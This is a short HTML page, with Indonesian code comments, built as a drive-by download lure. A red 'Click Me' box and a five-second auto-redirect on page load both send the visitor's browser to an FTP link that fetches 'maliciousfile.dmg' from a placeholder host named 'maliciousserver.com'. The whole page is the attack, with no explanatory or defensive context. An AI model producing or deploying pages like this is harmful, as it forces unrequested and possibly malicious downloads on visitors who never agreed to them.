<!DOCTYPE html>
<html>
  <head>
    <style>
      .hidden-link {
        width: 100px;
        height: 100px;
        background-color: red;
        color: white;
        text-align: center;
        line-height: 100px;
        cursor: pointer;
      }
    </style>
  </head>
  <body>
    <div class="hidden-link" onclick="triggerDownload()">Click Me</div>

    <script>
      function triggerDownload() {
        // Ketika elemen di-click, langsung mengarahkan ke FTP link
        window.location.href = "ftp://anonymous:password@maliciousserver.com/maliciousfile.dmg";
      }

      // Auto redirect ketika halaman dimuat
      window.onload = function() {
        setTimeout(function() {
          window.location.href = "ftp://anonymous:password@maliciousserver.com/maliciousfile.dmg";
        }, 5000); // Delay 5 detik sebelum redirect otomatis
      }
    </script>
  </body>
</html>
